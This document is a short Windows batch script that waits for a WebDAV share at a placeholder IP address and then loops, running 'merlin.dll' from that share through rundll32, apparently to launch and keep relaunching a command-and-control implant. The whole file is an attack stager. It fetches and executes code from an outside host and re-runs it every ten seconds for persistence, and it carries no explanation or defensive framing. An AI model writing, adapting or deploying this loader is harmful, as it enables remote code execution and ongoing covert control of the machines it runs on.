@echo off
:rcnt
timeout 60
if not exist \\<ip_address>\webdav goto rcnt
if exist \\<ip_address>\webdav goto map
:map
net use B: \\<ip_address>\webdav /persistent:no
net use B: /delete
:start
rundll32.exe \\<ip_address>\webdav\merlin.dll,Run
timeout 10
goto start
